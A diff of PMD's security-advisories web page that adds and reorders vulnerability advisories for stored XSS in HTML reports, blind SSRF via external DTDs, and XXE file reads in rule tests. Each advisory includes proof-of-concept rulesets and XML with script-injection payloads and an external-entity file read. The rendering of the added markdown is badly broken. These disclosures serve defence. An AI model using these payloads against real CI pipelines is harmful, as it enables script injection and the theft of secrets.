@@ -2057,292 +2057,448 @@
   <p>For reporting security issues, see <a href="https://github.com/pmd/pmd/blob/main/SECURITY.md">SECURITY.md</a>.</p>
 
 <h2 id="security-vulnerabilities">Security Vulnerabilities</h2>
-<h3 id="ghsa-5x5v-644m-q2qc">GHSA-5x5v-644m-q2qc</h3>
-<p><strong>Published:</strong> 2026-10-30</p>
-
-<p><strong>CVE:</strong> requested</p>
-
-<p><strong>Severity:</strong> Moderate</p>
-
-<p><strong>Summary:</strong> XSS via externalInfoUrl in HTML report formats</p>
-
-<p><strong>Versions Affected:</strong></p>
-<ul>
-  <li>net.sourceforge.pmd:pmd-core 7.28.0 and earlier</li>
-</ul>
-
-<p><strong>Description:</strong>
-PMD’s <code class="language-plaintext highlighter-rouge">pmd-core</code> HTML renderers place attacker-controlled ruleset metadata into generated HTML
-without context-appropriate escaping or URL-scheme validation. A crafted custom ruleset can inject executable
-markup into a <code class="language-plaintext highlighter-rouge">summaryhtml</code> or <code class="language-plaintext highlighter-rouge">html</code> report when suppressed violations are rendered (<code class="language-plaintext highlighter-rouge">--show-suppressed</code>).
-It can also put a <code class="language-plaintext highlighter-rouge">javascript:</code> URL in a normal HTML violation link, which executes if the report viewer clicks the link.</p>
-
-<p>Exploitation requires PMD to load an attacker-controlled ruleset and a user to open the generated report.
-The <code class="language-plaintext highlighter-rouge">javascript:</code> link variant additionally requires a click. The issue is in report generation, not PMD’s ordinary
-source analysis by itself.</p>
-
-<p><strong>Details:</strong></p>
-
-<p>The issue stems from two unsafe output paths in <code class="language-plaintext highlighter-rouge">HTMLRenderer</code>, which <code class="language-plaintext highlighter-rouge">SummaryHTMLRenderer</code> reuses, and from
-missing validation in <code class="language-plaintext highlighter-rouge">RuleFactory</code>:</p>
-
-<ol>
-  <li><code class="language-plaintext highlighter-rouge">HTMLRenderer.renderRuleNameEscaped</code> escapes the rule name but concatenates <code class="language-plaintext highlighter-rouge">externalInfoUrl</code> directly
-into an HTML <code class="language-plaintext highlighter-rouge">href</code> attribute (HTMLRenderer.java:175). When suppressed warnings are rendered
-(with <code class="language-plaintext highlighter-rouge">--show-suppressed</code>), a quote in this attribute value can break out and inject markup.</li>
-  <li><code class="language-plaintext highlighter-rouge">HTMLRenderer.glomRuleViolations</code> parses <code class="language-plaintext highlighter-rouge">externalInfoUrl</code> with <code class="language-plaintext highlighter-rouge">URI.create</code> and inserts it into an <code class="language-plaintext highlighter-rouge">href</code>.
-URI parsing does not reject the <code class="language-plaintext highlighter-rouge">javascript:</code> scheme. A violation can therefore produce a JavaScript URL that
-runs when clicked.</li>
-  <li><code class="language-plaintext highlighter-rouge">SummaryHTMLRenderer.outputReport</code> delegates to <code class="language-plaintext highlighter-rouge">HTMLRenderer</code> for violations and suppressions, so it
-inherits both issues.</li>
-  <li><code class="language-plaintext highlighter-rouge">RuleFactory</code> accepts <code class="language-plaintext highlighter-rouge">externalInfoUrl</code> from ruleset XML without any validation or restrictions.</li>
-</ol>
-
-<p><strong>PoC:</strong></p>
-
-<p>These examples use only a harmless <code class="language-plaintext highlighter-rouge">alert()</code> call.</p>
-
-<ol>
-  <li>Define a ruleset with crafted <code class="language-plaintext highlighter-rouge">externalInfoUrl</code> values and two test sources:</li>
-</ol>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat &gt; rs.xml &lt;&lt;'EOF'
-&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;ruleset name="PoC" xmlns="http://pmd.sourceforge.net/ruleset/2.0.0"&gt;
-  &lt;description&gt;Local synthetic test&lt;/description&gt;
-  &lt;rule name="AttrPoc" language="java"
-        class="net.sourceforge.pmd.lang.rule.xpath.XPathRule"
-        message="Synthetic violation"
-        externalInfoUrl="&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;alert('attribute')&amp;quot;&amp;gt;"&gt;
-    &lt;description&gt;Local synthetic test rule&lt;/description&gt;
-    &lt;priority&gt;3&lt;/priority&gt;
-    &lt;properties&gt;
-      &lt;property name="xpath" value="//ClassDeclaration"/&gt;
-    &lt;/properties&gt;
-  &lt;/rule&gt;
-
-  &lt;rule name="JsUriPoc" language="java"
-        class="net.sourceforge.pmd.lang.rule.xpath.XPathRule"
-        message="Synthetic violation"
-        externalInfoUrl="javascript:alert('scheme')"&gt;
-    &lt;description&gt;Local synthetic test rule&lt;/description&gt;
-    &lt;priority&gt;3&lt;/priority&gt;
-    &lt;properties&gt;
-      &lt;property name="xpath" value="//ClassDeclaration"/&gt;
-    &lt;/properties&gt;
-  &lt;/rule&gt;
-&lt;/ruleset&gt;
-EOF
-
-mkdir -p src
-echo 'class T {} // NOPMD' &gt; src/T.java
-echo 'class U {}' &gt; src/U.java
-</code></pre></div></div>
-
-<ol>
-  <li>Generate the reports:</li>
-</ol>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pmd check --no-progress --no-cache --show-suppressed \
-  -d src/T.java -R rs.xml -f summaryhtml -r summary.html \
-  --no-fail-on-violation
-
-pmd check --no-progress --no-cache --show-suppressed \
-  -d src/T.java -R rs.xml -f html -r report.html \
-  --no-fail-on-violation
-
-pmd check --no-progress --no-cache \
-  -d src/U.java -R rs.xml/JsUriPoc -f html -r report-jsuri.html \
-  --no-fail-on-violation
-</code></pre></div></div>
-
-<ol>
-  <li>Observe the issues:</li>
-</ol>
-
-<ul>
-  <li><code class="language-plaintext highlighter-rouge">summary.html</code> and <code class="language-plaintext highlighter-rouge">report.html</code> contain <code class="language-plaintext highlighter-rouge">&lt;img src=x onerror="alert('attribute')"&gt;</code>. Opening the
-report in a browser runs the script.</li>
-  <li><code class="language-plaintext highlighter-rouge">summary.html</code> and <code class="language-plaintext highlighter-rouge">report.html</code> contain a link <code class="language-plaintext highlighter-rouge">&lt;a href="javascript:alert('scheme')"&gt;JsUriPoc&lt;/a&gt;</code>.
-Clicking the link runs the script.</li>
-  <li><code class="language-plaintext highlighter-rouge">report-jsuri.html</code> contains a link <code class="language-plaintext highlighter-rouge">&lt;a href="javascript:alert('scheme')"&gt;Synthetic violation&lt;/a&gt;</code>. 
-Clicking the link runs the script.</li>
-</ul>
-
-<p><strong>Expected:</strong> The <code class="language-plaintext highlighter-rouge">externalInfoUrl</code> is properly escaped when used in the <code class="language-plaintext highlighter-rouge">href</code> attribute of a link element,
-and <code class="language-plaintext highlighter-rouge">javascript:</code> URLs are rejected or not rendered as links.</p>
-
-<p><strong>Actual:</strong> <code class="language-plaintext highlighter-rouge">HTMLRenderer</code> inserts <code class="language-plaintext highlighter-rouge">externalInfoUrl</code> unescaped, allowing attribute injection, and does not
-block <code class="language-plaintext highlighter-rouge">javascript:</code> URLs, which execute when clicked.</p>
-
-<p><strong>Impact:</strong></p>
-
-<p>CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</p>
-
-<p>Stored XSS in the generated <code class="language-plaintext highlighter-rouge">summaryhtml</code> and <code class="language-plaintext highlighter-rouge">html</code> reports. When suppressed violations are rendered
-(<code class="language-plaintext highlighter-rouge">--show-suppressed</code>), the injected script runs on load with no click. The <code class="language-plaintext highlighter-rouge">javascript:</code> URL variant affects
-normal violations as well, but requires the viewer to click the link. This is relevant to workflows that
-analyze untrusted contributions and make HTML reports available to reviewers (e.g., a published CI dashboard).
-Script access is limited by the origin and browser policy under which the report is opened.</p>
-
-<p><strong>Fixes:</strong></p>
-<ul>
-  <li>See <a href="https://github.com/pmd/pmd/pull/TODO">#PR TODO</a> [core] HTMLRenderers: Properly escape rule name and externalInfoUrl</li>
-</ul>
-
-<p><strong>References:</strong></p>
-<ul>
-  <li><a href="https://github.com/advisories/GHSA-8rr6-2qw5-pc7r">CVE-2026-28338</a> - Stored XSS in HTML renderers via unescaped violation messages</li>
-  <li><a href="https://github.com/pmd/pmd/security/advisories/GHSA-x2h8-xxj6-pf6c">GHSA-x2h8-xxj6-pf6c</a> - Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’) in summaryhtml report format</li>
-</ul>
-
-<h3 id="ghsa-x2h8-xxj6-pf6c">GHSA-x2h8-xxj6-pf6c</h3>
-<p><strong>Published:</strong> 2026-10-30</p>
-
-<p><strong>CVE:</strong> requested</p>
-
-<p><strong>Severity:</strong> Moderate</p>
-
-<p><strong>Summary:</strong> XSS via rule name in summaryhtml report format</p>
-
-<p><strong>Versions Affected:</strong></p>
-<ul>
-  <li>net.sourceforge.pmd:pmd-core 7.28.0 and earlier</li>
-</ul>
-
-<p><strong>Description:</strong>
-PMD’s <code class="language-plaintext highlighter-rouge">summaryhtml</code> report format prints a summary table of rule names and their violation counts. The renderer writes
-the rule name straight into the HTML with no escaping. A rule name that contains markup is emitted verbatim, so a
-report opened in a browser executes the script. This is the same weakness class as <a href="#CVE-2026-28338">CVE-2026-28338</a>,
-in a renderer and a field that the fix for that advisory did not touch. The main HTMLRenderer escapes the rule
-name through <code class="language-plaintext highlighter-rouge">renderRuleNameEscaped</code>; SummaryHTMLRenderer does not.</p>
-
-<p>The rule name comes from the ruleset. This reproduces when the ruleset used for analysis is attacker-influenced,
-which is the CI case where the ruleset is checked out from an untrusted pull request, or any workflow that runs
-a ruleset from an untrusted source.</p>
-
-<p><strong>Details:</strong></p>
-
-<ul>
-  <li><code class="language-plaintext highlighter-rouge">SummaryHTMLRenderer.renderSummary</code> builds each row with <code class="language-plaintext highlighter-rouge">writer.write(ruleName)</code> and no escaper
-(SummaryHTMLRenderer.java:66-68), where <code class="language-plaintext highlighter-rouge">ruleName</code> is <code class="language-plaintext highlighter-rouge">rv.getRule().getName()</code>.</li>
-  <li>Rule names are read verbatim from the ruleset XML by the rule factory with no character validation.
-XML entities in the <code class="language-plaintext highlighter-rouge">name</code> attribute decode to raw characters, so <code class="language-plaintext highlighter-rouge">name="&amp;lt;script&amp;gt;...&amp;lt;/script&amp;gt;"</code>
-becomes the literal <code class="language-plaintext highlighter-rouge">&lt;script&gt;...&lt;/script&gt;</code>.</li>
-  <li>The CVE-2026-28338 fix (#6475) added escaping to VBHTMLRenderer, YAHTMLRenderer, and the HTMLRenderer
-suppressed-violation path. It did not add escaping to SummaryHTMLRenderer, so this sibling sink remained.</li>
-</ul>
-
-<p><strong>PoC:</strong></p>
-
-<p>Setup: PMD 7.27.0 binary distribution. A ruleset whose rule name carries the payload.</p>
-
-<ol>
-  <li>Define a rule whose name is an XSS payload</li>
-</ol>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat &gt; rs.xml &lt;&lt;'EOF'
-&lt;?xml version="1.0"?&gt;
-&lt;ruleset name="poc" xmlns="http://pmd.sourceforge.net/ruleset/2.0.0"&gt;
-  &lt;description&gt;poc&lt;/description&gt;
-  &lt;rule name="&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;"
-        language="java" message="hit"
-        class="net.sourceforge.pmd.lang.rule.xpath.XPathRule"&gt;
-    &lt;properties&gt;&lt;property name="xpath"&gt;&lt;value&gt;//ClassDeclaration&lt;/value&gt;&lt;/property&gt;&lt;/properties&gt;
-  &lt;/rule&gt;
-&lt;/ruleset&gt;
-EOF
-mkdir -p src &amp;&amp; echo 'public class A { void m() {} }' &gt; src/A.java
-</code></pre></div></div>
-
-<ol>
-  <li>Generate the summaryhtml report</li>
-</ol>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pmd check -d src -R rs.xml -f summaryhtml --no-cache
-</code></pre></div></div>
-
-<ol>
-  <li>Read the emitted HTML</li>
-</ol>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;tr&gt;&lt;td&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;/td&gt;&lt;td align=center&gt;1&lt;/td&gt;&lt;/tr&gt;
-</code></pre></div></div>
-
-<p>The rule name is written into the table cell unescaped. Opening the report in a browser runs the script.</p>
-
-<p><strong>Expected:</strong> the rule name is HTML-escaped before being written into the report, the same way HTMLRenderer escapes it.
-<strong>Actual:</strong> SummaryHTMLRenderer writes the rule name raw, so markup in the name executes.</p>
-
-<p><strong>Impact:</strong></p>
-
-<p>Stored XSS in the generated <code class="language-plaintext highlighter-rouge">summaryhtml</code> report. The script runs in the browser of whoever opens the report,
-which in CI is a developer or reviewer reading the analysis output. It runs on load with no click. Where the report
-is served from a domain (a published CI dashboard, an internal report host), the script runs in that origin and can
-act with the viewer’s session there.</p>
-
-<p><strong>Fixes:</strong></p>
-<ul>
-  <li>See <a href="https://github.com/pmd/pmd/pull/TODO">#PR TODO</a> [core] HTMLRenderers: Properly escape rule name and externalInfoUrl</li>
-</ul>
-
-<p><strong>References:</strong></p>
-<ul>
-  <li><a href="https://github.com/pmd/pmd/security/advisories/GHSA-x2h8-xxj6-pf6c">GHSA-x2h8-xxj6-pf6c</a></li>
-</ul>
-
-<h3 id="ghsa-wj6q-xw9m-26p6">GHSA-wj6q-xw9m-26p6</h3>
+<h3 id="ghsa-wv72-2ccf-28gj">GHSA-wv72-2ccf-28gj</h3>
 <p><strong>Published:</strong> 2026-10-30</p>
 
 <p><strong>CVE:</strong> requested</p>
 
 <p><strong>Severity:</strong> Medium</p>
 
-<p><strong>Summary:</strong> Arbitrary file disclosure in CPD via symlinks in analyzed sources</p>
+<p><strong>Summary:</strong> Blind SSRF through Visualforce metadata parser</p>
 
 <p><strong>Versions Affected:</strong></p>
 <ul>
-  <li>net.sourceforge.pmd:pmd-core 7.28.0 and earlier, starting with 6.54.0</li>
+  <li>net.sourceforge.pmd:pmd-visualforce &gt;= 6.30.0, &lt;= 7.28.0</li>
 </ul>
 
-<p><strong>Description:</strong>
+<p><strong>Description:</strong></p>
+
+<p>PMD’s Visualforce metadata parser reads Salesforce field metadata files to find out about custom field types.
+These metadata files are XML files and PMD parses them without disabling external DTD loading, so it fetches
+any external DTD a file references. A crafted metadata file can cause PMD to make a network request to an
+attacker-chosen URL during analysis.</p>
+
+<p><strong>Details:</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">ObjectFieldTypes</code> creates a <code class="language-plaintext highlighter-rouge">javax.xml.parsers.DocumentBuilder</code> and disables external general and parameter
+entities, but does not disable external DTD loading (ObjectFieldTypes.java:105).</li>
+  <li><code class="language-plaintext highlighter-rouge">ObjectFieldTypes.parseSfdxCustomField</code> parses field metadata and uses XPath expressions to query it
+(ObjectFieldTypes.java:202).</li>
+  <li>The Visualforce parser reaches this code path through <code class="language-plaintext highlighter-rouge">VfExpressionTypeVisitor</code> (VfExpressionTypeVisitor.java:142).</li>
+  <li>The field metadata files are part of the analyzed source tree and are untrusted data.</li>
+</ul>
+
+<p><strong>PoC:</strong></p>
+
+<p>Setup: PMD 7.28.0 binary distribution. An SFDX project with a crafted <code class="language-plaintext highlighter-rouge">field-meta.xml</code> file.</p>
+
+<ol>
+  <li>Create an empty file <code class="language-plaintext highlighter-rouge">probe.dtd</code>:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>touch probe.dtd
+</code></pre></div>    </div>
+  </li>
+  <li>Start a web server on 127.0.0.1:8000 in the directory containing <code class="language-plaintext highlighter-rouge">probe.dtd</code> in a second terminal:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jwebserver -p 8000
+</code></pre></div>    </div>
+  </li>
+  <li>Create a small SFDX sample project to analyze:
+```
+mkdir -p objects/Account/fields
+cat &gt; objects/Account/fields/Hit__c.field-meta.xml «‘EOF’
+&lt;!DOCTYPE CustomField SYSTEM ‘http://127.0.0.1:8000/probe.dtd’&gt;</li>
+</ol>
+<CustomField>
+  <fullName>Hit__c</fullName>
+  <type>Text</type>
+</CustomField>
+<p>EOF</p>
+
+<p>mkdir -p pages
+cat &gt; pages/page.page «‘EOF’</p>
+<apex:page standardController="Account">
+  <apex:outputText value="{!Account.Hit__c}" escape="false" />
+</apex:page>
+<p>EOF</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+4. Execute PMD:
+</code></pre></div></div>
+<p>pmd check –no-progress –no-cache -d . -R category/visualforce/security.xml</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+5. Observe the request in the web server log:
+</code></pre></div></div>
+<p>127.0.0.1 - - [09/Oct/2026:15:31:38 +0200] “GET /probe.dtd HTTP/1.1” 200 -</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+This confirms blind external DTD network access.
+
+**Expected:** PMD should not load the remote DTD.
+
+**Actual:** PMD fetches the DTD over the network.
+
+**Impact:**
+
+CWE-827: Improper Control of Document Type Definition
+
+CWE-918: Server-Side Request Forgery (SSRF)
+
+This allows blind SSRF: an attacker can make PMD send requests to any URL reachable from the machine
+running it. This affects users who use PMD to analyze Visualforce code from untrusted sources,
+such as pull requests.
+
+**Fixes:**
+* See [#7261](https://github.com/pmd/pmd/pull/7261) \[core] Disallow external entity expansions/DTD in XML parsing
+
+**References:**
+* [GHSA-wv72-2ccf-28gj](https://github.com/pmd/pmd/security/advisories/GHSA-wv72-2ccf-28gj) - Blind SSRF through Visualforce metadata parser
+
+
+
+### GHSA-9hm5-r2r7-hjcq
+**Published:** 2026-10-30
+
+**CVE:** requested
+
+**Severity:** Medium
+
+**Summary:** Local file reads through XXE in PMD rule tests
+
+**Versions Affected:**
+* pmd:pmd &gt;= 3.9
+* net.sourceforge.pmd:pmd-test &lt;= 6.47.0
+* net.sourceforge.pmd:pmd-test-schema &gt;= 6.48.0, &lt;= 7.28.0
+
+**Description:**
+PMD provides a custom test framework for testing rules. The test cases are defined in an XML rule-tests file.
+`pmd-test-schema` parses these rule-tests XML files with external entities enabled. A crafted XML rule-tests
+file can cause the process running PMD rule tests to read a local file and place its contents in a parsed test
+description. This was reproduced against PMD’s actual parser.
+
+**Details:**
+
+* `TestSchemaParser.newDocumentBuilder` creates a new `javax.xml.parsers.DocumentBuilder` with schema validation
+  enabled, but it does not disable DTD parsing or external entities (TestSchemaParser.java:140-145).
+* `TestSchemaParser.parse` passes that `DocumentBuilder` instance and the supplied `InputSource` to
+  `OoxmlFacade.parse` (TestSchemaParser.java:81).
+* `RuleTst.parseTestXml` loads the XML rule-tests through this parser (RuleTst.java:338-346).
+* `RuleTst.toDynamicTest` uses the parsed test description as a JUnit dynamic test name (RuleTst.java:398-409).
+* This test name will be in the JUnit reports, creating a possible route for file contents to appear in test results.
+
+**PoC:**
+
+1. Create a file that should be read:
+</code></pre></div></div>
+<p>mkdir LOCAL_FILE
+printf ‘AWS_SECRET_ACCESS_KEY = wJalrXUtnFEMI…EXAMPLEKEY;\nDATABASE_PASSWORD = super_secret_prod_password_12345;\n’ &gt; LOCAL_FILE/secrets.txt</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+2. Check out PMD (this would be done by CI):
+</code></pre></div></div>
+<p>git clone –depth=1 –single-branch https://github.com/pmd/pmd.git</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+3. Replace a rule-tests XML file with malicious content (this would be done in the PR):
+</code></pre></div></div>
+<p>cat &gt; pmd/pmd-apex/src/test/resources/net/sourceforge/pmd/lang/apex/rule/bestpractices/xml/ApexAssertionsShouldIncludeMessage.xml «‘EOF’
+&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;
+&lt;!DOCTYPE test-data [&lt;!ENTITY leak SYSTEM ‘../../../LOCAL_FILE/secrets.txt’&gt;]&gt;</p>
+<test-data xmlns="http://pmd.sourceforge.net/rule-tests" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://pmd.sourceforge.net/rule-tests http://pmd.sourceforge.net/rule-tests_1_0_0.xsd">
+    <test-code>
+        <description>&leak;</description>
+        <expected-problems>1</expected-problems>
+        <code>public class Foo {}</code>
+    </test-code>
+
+    <!-- some more text, so that the file is longer than the injected description of the test case above. -->
+</test-data>
+<p>EOF</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+4. Run the build with Maven:
+</code></pre></div></div>
+<p>pmd/mvnw -f pmd/pom.xml -PfastSkip <br />
+   -Dtest=ApexAssertionsShouldIncludeMessageTest <br />
+   -Dsurefire.failIfNoSpecifiedTests=false <br />
+  verify</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+5. The test failure shows the content of the local file:
+</code></pre></div></div>
+<p>[INFO] Running net.sourceforge.pmd.lang.apex.rule.bestpractices.ApexAssertionsShouldIncludeMessageTest
+————————————————————–
+Test Failure: AWS_SECRET_ACCESS_KEY = wJalrXUtnFEMI…EXAMPLEKEY;
+DATABASE_PASSWORD = super_secret_prod_password_12345;
+ -&gt; Expected 1 problem(s), 0 problem(s) found.
+ -&gt; Expected messages: []
+ -&gt; Expected begin line numbers: []</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+Note: This can also be easily reproduced with the example project for custom rules at https://github.com/pmd/pmd-examples/tree/main/custom-rules/maven-java
+
+**Expected:** The test case is not executed, as it contains a reference to an externally defined entity.
+
+**Actual:** The test case is executed and reveals the content of a local file.
+
+**Impact:**
+
+CWE-611: Improper Restriction of XML External Entity Reference
+
+This affects projects that use PMD's test framework and parse untrusted rule-tests XML files. This includes,
+but is not limited to, PMD itself. Rule-testing jobs with access to files that the XML author cannot otherwise
+read are particularly at risk. The PoC confirms that a local file can be read into a test description and
+exfiltrated through the build logs. These logs are usually available through the CI output.
+
+**Fixes:**
+* See [#7261](https://github.com/pmd/pmd/pull/7261) \[core] Disallow external entity expansions/DTD in XML parsing
+
+**References:**
+* [GHSA-9hm5-r2r7-hjcq](https://github.com/pmd/pmd/security/advisories/GHSA-9hm5-r2r7-hjcq) - Local file reads through XXE in PMD rule tests
+
+
+
+### GHSA-5x5v-644m-q2qc
+**Published:** 2026-10-30
+
+**CVE:** requested
+
+**Severity:** Moderate
+
+**Summary:** XSS via externalInfoUrl in HTML report formats
+
+**Versions Affected:**
+* net.sourceforge.pmd:pmd-core 7.28.0 and earlier
+
+**Description:**
+PMD's `pmd-core` HTML renderers place attacker-controlled ruleset metadata into generated HTML
+without context-appropriate escaping or URL-scheme validation. A crafted custom ruleset can inject executable
+markup into a `summaryhtml` or `html` report when suppressed violations are rendered (`--show-suppressed`).
+It can also put a `javascript:` URL in a normal HTML violation link, which executes if the report viewer clicks the link.
+
+Exploitation requires PMD to load an attacker-controlled ruleset and a user to open the generated report.
+The `javascript:` link variant additionally requires a click. The issue is in report generation, not PMD's ordinary
+source analysis by itself.
+
+**Details:**
+
+The issue stems from two unsafe output paths in `HTMLRenderer`, which `SummaryHTMLRenderer` reuses, and from
+missing validation in `RuleFactory`:
+
+1.  `HTMLRenderer.renderRuleNameEscaped` escapes the rule name but concatenates `externalInfoUrl` directly
+    into an HTML `href` attribute (HTMLRenderer.java:175). When suppressed warnings are rendered
+    (with `--show-suppressed`), a quote in this attribute value can break out and inject markup.
+2.  `HTMLRenderer.glomRuleViolations` parses `externalInfoUrl` with `URI.create` and inserts it into an `href`.
+    URI parsing does not reject the `javascript:` scheme. A violation can therefore produce a JavaScript URL that
+    runs when clicked.
+3.  `SummaryHTMLRenderer.outputReport` delegates to `HTMLRenderer` for violations and suppressions, so it
+    inherits both issues.
+4.  `RuleFactory` accepts `externalInfoUrl` from ruleset XML without any validation or restrictions.
+
+**PoC:**
+
+These examples use only a harmless `alert()` call.
+
+1. Define a ruleset with crafted `externalInfoUrl` values and two test sources:
+
+</code></pre></div></div>
+<p>cat &gt; rs.xml «‘EOF’
+&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</p>
+<ruleset name="PoC" xmlns="http://pmd.sourceforge.net/ruleset/2.0.0">
+  <description>Local synthetic test</description>
+  <rule name="AttrPoc" language="java" class="net.sourceforge.pmd.lang.rule.xpath.XPathRule" message="Synthetic violation" externalInfoUrl="&quot;&gt;&lt;img src=x onerror=&quot;alert('attribute')&quot;&gt;">
+    <description>Local synthetic test rule</description>
+    <priority>3</priority>
+    <properties>
+      <property name="xpath" value="//ClassDeclaration" />
+    </properties>
+  </rule>
+
+  <rule name="JsUriPoc" language="java" class="net.sourceforge.pmd.lang.rule.xpath.XPathRule" message="Synthetic violation" externalInfoUrl="javascript:alert('scheme')">
+    <description>Local synthetic test rule</description>
+    <priority>3</priority>
+    <properties>
+      <property name="xpath" value="//ClassDeclaration" />
+    </properties>
+  </rule>
+</ruleset>
+<p>EOF</p>
+
+<p>mkdir -p src
+echo ‘class T {} // NOPMD’ &gt; src/T.java
+echo ‘class U {}’ &gt; src/U.java</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+2. Generate the reports:
+
+</code></pre></div></div>
+<p>pmd check –no-progress –no-cache –show-suppressed <br />
+  -d src/T.java -R rs.xml -f summaryhtml -r summary.html <br />
+  –no-fail-on-violation</p>
+
+<p>pmd check –no-progress –no-cache –show-suppressed <br />
+  -d src/T.java -R rs.xml -f html -r report.html <br />
+  –no-fail-on-violation</p>
+
+<p>pmd check –no-progress –no-cache <br />
+  -d src/U.java -R rs.xml/JsUriPoc -f html -r report-jsuri.html <br />
+  –no-fail-on-violation</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+3. Observe the issues:
+
+*   `summary.html` and `report.html` contain `&lt;img src=x onerror="alert('attribute')"&gt;`. Opening the
+    report in a browser runs the script.
+*   `summary.html` and `report.html` contain a link `&lt;a href="javascript:alert('scheme')"&gt;JsUriPoc&lt;/a&gt;`.
+    Clicking the link runs the script.
+*   `report-jsuri.html` contains a link `&lt;a href="javascript:alert('scheme')"&gt;Synthetic violation&lt;/a&gt;`. 
+    Clicking the link runs the script.
+
+
+**Expected:** The `externalInfoUrl` is properly escaped when used in the `href` attribute of a link element,
+and `javascript:` URLs are rejected or not rendered as links.
+
+**Actual:** `HTMLRenderer` inserts `externalInfoUrl` unescaped, allowing attribute injection, and does not
+block `javascript:` URLs, which execute when clicked.
+
+**Impact:**
+
+CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
+
+Stored XSS in the generated `summaryhtml` and `html` reports. When suppressed violations are rendered
+(`--show-suppressed`), the injected script runs on load with no click. The `javascript:` URL variant affects
+normal violations as well, but requires the viewer to click the link. This is relevant to workflows that
+analyze untrusted contributions and make HTML reports available to reviewers (e.g., a published CI dashboard).
+Script access is limited by the origin and browser policy under which the report is opened.
+
+**Fixes:**
+* See [#7260](https://github.com/pmd/pmd/pull/7260) \[core] HTMLRenderers: Properly escape rule name and externalInfoUrl
+
+**References:**
+* [CVE-2026-28338](https://github.com/advisories/GHSA-8rr6-2qw5-pc7r) - Stored XSS in HTML renderers via unescaped violation messages
+* [GHSA-x2h8-xxj6-pf6c](https://github.com/pmd/pmd/security/advisories/GHSA-x2h8-xxj6-pf6c) - XSS via rule name in summaryhtml report format
+* [GHSA-5x5v-644m-q2qc](https://github.com/pmd/pmd/security/advisories/GHSA-5x5v-644m-q2qc) - XSS via externalInfoUrl in HTML report formats
+
+
+
+### GHSA-x2h8-xxj6-pf6c
+**Published:** 2026-10-30
+
+**CVE:** requested
+
+**Severity:** Moderate
+
+**Summary:** XSS via rule name in summaryhtml report format
+
+**Versions Affected:**
+* net.sourceforge.pmd:pmd-core 7.28.0 and earlier
+
+**Description:**
+PMD's `summaryhtml` report format prints a summary table of rule names and their violation counts. The renderer writes
+the rule name straight into the HTML with no escaping. A rule name that contains markup is emitted verbatim, so a
+report opened in a browser executes the script. This is the same weakness class as [CVE-2026-28338](#CVE-2026-28338),
+in a renderer and a field that the fix for that advisory did not touch. The main HTMLRenderer escapes the rule
+name through `renderRuleNameEscaped`; SummaryHTMLRenderer does not.
+
+The rule name comes from the ruleset. This reproduces when the ruleset used for analysis is attacker-influenced,
+which is the CI case where the ruleset is checked out from an untrusted pull request, or any workflow that runs
+a ruleset from an untrusted source.
+
+**Details:**
+
+-   `SummaryHTMLRenderer.renderSummary` builds each row with `writer.write(ruleName)` and no escaper
+    (SummaryHTMLRenderer.java:66-68), where `ruleName` is `rv.getRule().getName()`.
+-   Rule names are read verbatim from the ruleset XML by the rule factory with no character validation.
+    XML entities in the `name` attribute decode to raw characters, so `name="&amp;lt;script&amp;gt;...&amp;lt;/script&amp;gt;"`
+    becomes the literal `&lt;script&gt;...&lt;/script&gt;`.
+-   The CVE-2026-28338 fix (#6475) added escaping to VBHTMLRenderer, YAHTMLRenderer, and the HTMLRenderer
+    suppressed-violation path. It did not add escaping to SummaryHTMLRenderer, so this sibling sink remained.
+
+**PoC:**
+
+Setup: PMD 7.27.0 binary distribution. A ruleset whose rule name carries the payload.
+
+1. Define a rule whose name is an XSS payload
+
+</code></pre></div></div>
+<p>cat &gt; rs.xml «‘EOF’
+&lt;?xml version=”1.0”?&gt;</p>
+<ruleset name="poc" xmlns="http://pmd.sourceforge.net/ruleset/2.0.0">
+  <description>poc</description>
+  <rule name="&lt;script&gt;alert(document.domain)&lt;/script&gt;" language="java" message="hit" class="net.sourceforge.pmd.lang.rule.xpath.XPathRule">
+    <properties><property name="xpath"><value>//ClassDeclaration</value></property></properties>
+  </rule>
+</ruleset>
+<p>EOF
+mkdir -p src &amp;&amp; echo ‘public class A { void m() {} }’ &gt; src/A.java</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+2. Generate the summaryhtml report
+
+</code></pre></div></div>
+<p>pmd check -d src -R rs.xml -f summaryhtml –no-cache</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+3. Read the emitted HTML
+
+</code></pre></div></div>
